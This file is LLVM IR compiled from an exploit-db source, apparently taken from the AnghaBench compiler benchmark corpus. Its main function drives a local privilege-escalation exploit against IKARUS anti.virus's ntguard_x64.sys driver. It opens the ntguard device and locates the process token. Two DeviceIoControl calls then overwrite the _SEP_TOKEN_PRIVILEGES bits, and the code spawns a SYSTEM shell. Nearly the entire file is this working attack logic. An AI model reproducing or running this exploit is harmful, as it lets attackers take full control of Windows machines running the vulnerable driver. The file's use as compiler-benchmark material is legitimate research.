; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43139.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43139.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAX_PATH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [81 x i8] c"-------------------------------------------------------------------------------\0A\00", align 1
@.str.1 = private unnamed_addr constant [81 x i8] c"        IKARUS anti.virus (ntguard_x64.sys) Arbitrary Write EoP Exploit        \0A\00", align 1
@.str.2 = private unnamed_addr constant [81 x i8] c"                 Tested on 64bit Windows 7 / Windows 10 (1709)                 \0A\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"\0A[i] Address of current process token 0x%p\00", align 1
@.str.4 = private unnamed_addr constant [64 x i8] c"\0A[i] Address of _SEP_TOKEN_PRIVILEGES 0x%p will be overwritten\0A\00", align 1
@.str.5 = private unnamed_addr constant [56 x i8] c"[i] Present bits at 0x%p will be overwritten with 0x11\0A\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"[i] Enabled bits at 0x%p will be overwritten with 0x11\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"\\\\.\\%s\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"ntguard\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@FILE_SHARE_READ = common dso_local global i32 0, align 4
@FILE_SHARE_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.9 = private unnamed_addr constant [29 x i8] c"\0A[-] Open %s device failed\0A\0A\00", align 1
@.str.10 = private unnamed_addr constant [31 x i8] c"\0A[+] Open %s device successful\00", align 1
@.str.11 = private unnamed_addr constant [38 x i8] c"\0A[~] Press any key to continue . . .\0A\00", align 1
@.str.12 = private unnamed_addr constant [44 x i8] c"[+] Overwritten _SEP_TOKEN_PRIVILEGES bits\0A\00", align 1
@.str.13 = private unnamed_addr constant [26 x i8] c"[*] Spawning SYSTEM Shell\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 64, i32* %7, align 4
  %16 = load i32, i32* @MAX_PATH, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %12, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %13, align 8
  store i32 0, i32* %14, align 4
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (...) @GetCurrentProcess()
  %25 = call i32 (...) @GetCurrentProcessId()
  %26 = call i32 @TokenAddressCurrentProcess(i32 %24, i32 %25)
  store i32 %26, i32* %10, align 4
  %27 = load i32, i32* %10, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0), i32 %27)
  %29 = load i32, i32* %10, align 4
  %30 = load i32, i32* %7, align 4
  %31 = add nsw i32 %29, %30
  store i32 %31, i32* %6, align 4
  %32 = load i32, i32* %6, align 4
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.4, i64 0, i64 0), i32 %32)
  %34 = load i32, i32* %6, align 4
  %35 = add nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %8, align 4
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.5, i64 0, i64 0), i32 %36)
  %38 = load i32, i32* %6, align 4
  %39 = add nsw i32 %38, 10
  store i32 %39, i32* %9, align 4
  %40 = load i32, i32* %9, align 4
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i64 0, i64 0), i32 %40)
  %42 = call i32 @sprintf(i8* %19, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0))
  %43 = load i32, i32* @GENERIC_READ, align 4
  %44 = load i32, i32* @GENERIC_WRITE, align 4
  %45 = or i32 %43, %44
  %46 = load i32, i32* @FILE_SHARE_READ, align 4
  %47 = load i32, i32* @FILE_SHARE_WRITE, align 4
  %48 = or i32 %46, %47
  %49 = load i32, i32* @OPEN_EXISTING, align 4
  %50 = call i64 @CreateFile(i8* %19, i32 %45, i32 %48, i32* null, i32 %49, i32 0, i32* null)
  store i64 %50, i64* %11, align 8
  %51 = load i64, i64* %11, align 8
  %52 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %53 = icmp eq i64 %51, %52
  br i1 %53, label %54, label %56

54:                                               ; preds = %2
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.9, i64 0, i64 0), i8* %19)
  store i32 -1, i32* %3, align 4
  store i32 1, i32* %15, align 4
  br label %72

56:                                               ; preds = %2
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.10, i64 0, i64 0), i8* %19)
  br label %58

58:                                               ; preds = %56
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.11, i64 0, i64 0))
  %60 = call i32 (...) @getch()
  %61 = load i64, i64* %11, align 8
  %62 = load i32, i32* %8, align 4
  %63 = call i32 @DeviceIoControl(i64 %61, i32 -2097151988, i32* null, i32 0, i32 %62, i32 0, i32* %14, i32* null)
  %64 = load i64, i64* %11, align 8
  %65 = load i32, i32* %9, align 4
  %66 = call i32 @DeviceIoControl(i64 %64, i32 -2097151988, i32* null, i32 0, i32 %65, i32 0, i32* %14, i32* null)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.12, i64 0, i64 0))
  %68 = load i64, i64* %11, align 8
  %69 = call i32 @CloseHandle(i64 %68)
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.13, i64 0, i64 0))
  %71 = call i32 (...) @spawnShell()
  store i32 0, i32* %3, align 4
  store i32 1, i32* %15, align 4
  br label %72

72:                                               ; preds = %58, %54
  %73 = load i8*, i8** %12, align 8
  call void @llvm.stackrestore(i8* %73)
  %74 = load i32, i32* %3, align 4
  ret i32 %74
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @TokenAddressCurrentProcess(i32, i32) #2

declare dso_local i32 @GetCurrentProcess(...) #2

declare dso_local i32 @GetCurrentProcessId(...) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32*) #2

declare dso_local i32 @getch(...) #2

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i32, i32, i32*, i32*) #2

declare dso_local i32 @CloseHandle(i64) #2

declare dso_local i32 @spawnShell(...) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
